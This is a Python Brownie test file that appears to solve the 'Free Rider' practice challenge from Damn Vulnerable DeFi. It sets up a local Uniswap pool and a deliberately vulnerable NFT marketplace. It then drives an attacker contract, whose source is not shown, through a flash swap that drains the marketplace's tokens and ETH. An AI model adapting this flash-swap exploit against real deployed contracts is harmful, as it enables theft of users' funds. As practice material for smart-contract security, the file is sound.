from scripts.utils import *
from brownie import WETH9, DamnValuableToken, FreeRiderNFTMarketplace, DamnValuableNFT, FreeRiderBuyer

def test_solve_challenge():
    ####################################################################
    ######### SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE #########
    ####################################################################
    web3 = import_web3()

    # The NFT marketplace will have 6 tokens, at 15 ETH each
    NFT_PRICE = ether_to_wei(15)
    AMOUNT_OF_NFTS = 6
    MARKETPLACE_INITIAL_ETH_BALANCE = ether_to_wei(90)
    # The buyer will offer 45 ETH as payout for the job
    BUYER_PAYOUT = ether_to_wei(45)
    # Initial reserves for the Uniswap v2 pool
    UNISWAP_INITIAL_TOKEN_RESERVE = ether_to_wei(15000)
    UNISWAP_INITIAL_WETH_RESERVE = ether_to_wei(9000)

    # import accounts
    deployer, _fromDeployer, attacker, _fromAttacker, buyer, _fromBuyer = define_from_acc(qty=3)

    # set attacker balance
    set_account_balance_network(attacker.address, hex(ether_to_wei(0.5)))
    # check attacker balance
    assert attacker.balance() == ether_to_wei(0.5)

    # deploy weth contract
    weth = WETH9.deploy(_fromDeployer)
    # deploy token contract
    token = DamnValuableToken.deploy(_fromDeployer)

    # get UniV2 contracts ABI and bytecode
    factoryABI, factoryBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Factory.json')
    routerABI, routerBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Router02.json')
    pairABI, pairBytecode = load_abi_and_bytecode_json('built_helper_contracts/build-uniswap-v2/UniswapV2Pair.json')

    # load UniV2 contracts
    uniswap_factory = load_contract_from_abi_and_bytecode('UniswapV2Factory', factoryABI, factoryBytecode, constructor_params=[(ZERO_ADDRESS, 'address')])
    uniswap_router = load_contract_from_abi_and_bytecode('UniswapV2Router', routerABI, routerBytecode, constructor_params=[(uniswap_factory.address, 'address'), (weth.address, 'address')])


    # Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
    # Note that the function takes care of deploying the pair automatically
    token.approve(uniswap_router.address, UNISWAP_INITIAL_TOKEN_RESERVE)
    uniswap_router.addLiquidityETH(
        token.address,
        UNISWAP_INITIAL_TOKEN_RESERVE,                  # amountTokenDesired
        0,                                              # amountTokenMin
        0,                                              # amountETHMin
        deployer.address,                               # to
        web3.eth.get_block('latest')['timestamp'] * 2,  # deadline
        _fromDeployer | value_dict(UNISWAP_INITIAL_WETH_RESERVE),
    )

    # Get a reference to the created Uniswap pair
    uniswap_pair = Contract.from_abi('UniswapV2Pair', uniswap_factory.getPair(token.address, weth.address), pairABI)
    # confirm pair information
    assert uniswap_pair.token0() == weth.address
    assert uniswap_pair.token1() == token.address
    assert uniswap_pair.balanceOf(deployer.address) > 0

    # Deploy the marketplace and get the associated ERC721 token
    # The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
    marketplace = FreeRiderNFTMarketplace.deploy(AMOUNT_OF_NFTS, _fromDeployer | value_dict(MARKETPLACE_INITIAL_ETH_BALANCE))

    # deploy NFT contract
    nft = DamnValuableNFT.at(marketplace.token())

    # Ensure deployer owns all minted NFTs
    for nft_id in range(AMOUNT_OF_NFTS):
        assert nft.ownerOf(nft_id) == deployer.address
    # approve the marketplace to trade them
    nft.setApprovalForAll(marketplace.address, True, _fromDeployer)

    # Open offers in the marketplace
    marketplace.offerMany([x for x in range(6)], [NFT_PRICE for x in range(6)], _fromDeployer)
    # check amount of offers
    assert marketplace.amountOfOffers() == 6

    # Deploy buyer's contract, adding the attacker as the partner
    buyer_contract = FreeRiderBuyer.deploy(attacker.address, nft.address, _fromBuyer | value_dict(BUYER_PAYOUT))

    # check if solved
    def check_solution():
        ############################################
        ############ SUCCESS CONDITIONS ############
        ############################################

        # Attacker must have earned all ETH from the payout
        assert attacker.balance() > BUYER_PAYOUT
        assert buyer_contract.balance() == 0

        # The buyer extracts all NFTs from its associated contract
        for token_id in range(AMOUNT_OF_NFTS):
            nft.transferFrom(buyer_contract.address, buyer.address, token_id, _fromBuyer)
            assert nft.ownerOf(token_id) == buyer.address

        # Exchange must have lost NFTs and ETH
        assert marketplace.amountOfOffers() == 0
        assert marketplace.balance() < MARKETPLACE_INITIAL_ETH_BALANCE

# ######################################################### 
# A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
#
# A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.
#
# You want to build some rep with this buyer, so you've agreed with the plan.
#
# Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant. 
# #########################################################

    ##############################
    ##### SOLUTION GOES HERE #####
    ##############################

    # import attacker contract
    from brownie import FreeRiderAttack;

    # deploy attacker contract
    attacker_contract = FreeRiderAttack.deploy(
        uniswap_factory.address,
        weth.address,
        token.address,
        marketplace.address,
        nft.address,
        buyer_contract.address,
        _fromAttacker
    )

    # approve nft moving for attacker contract
    nft.setApprovalForAll(attacker_contract.address, True, _fromAttacker)

    # take the flash swap
    attacker_contract.flashSwap(ether_to_wei(15), _fromAttacker)
 
    # recover leftover ETH from the attacker contract
    attacker_contract.recoverETH(_fromAttacker)

    ######################
    check_solution()
    
    
